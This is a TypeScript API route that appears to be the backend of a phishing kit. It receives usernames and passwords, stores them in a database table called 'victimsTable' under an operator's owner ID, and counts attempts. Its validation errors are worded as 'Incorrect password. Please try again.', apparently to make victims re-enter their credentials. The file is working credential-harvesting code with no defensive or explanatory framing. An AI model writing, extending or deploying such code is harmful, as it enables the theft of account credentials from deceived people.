import { db } from "@/db/db";
import { victimsTable } from "@/db/schema";
import z from "zod";

const detailsSchema = z.object({
  username: z.string().min(3).max(50),
  trial: z.number().min(1).optional(),
  //   make the password validation more strict by requiring at least 8 characters, one uppercase letter, one lowercase letter, and one number
  password: z
    .string()
    .min(8, "Incorrect password. Please try again.")
    .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).+$/, "Incorrect password"),
  id: z.string(),
});
export const POST = async (request: Request) => {
  const { username, password, id, trial } = await request.json();
  const data = detailsSchema.safeParse({ username, password, id, trial });
  console.log({ data: data.success ? data.data : data.error.issues });
  if (!data.success) {
    return new Response(
      JSON.stringify({ error: data.error.issues[0].message }),
      {
        headers: { "Content-Type": "application/json" },
        status: 400,
      },
    );
  }
  const result = await db
    .insert(victimsTable)
    .values({ username, password, ownerId: id, trial: trial || 1 })
    .returning();

  if (result.length === 0) {
    return new Response(JSON.stringify({ error: "Failed to create victim" }), {
      headers: { "Content-Type": "application/json" },
      status: 500,
    });
  }
  return new Response(JSON.stringify({ message: "Successful" }), {
    headers: { "Content-Type": "application/json" },
    status: 201,
  });
};
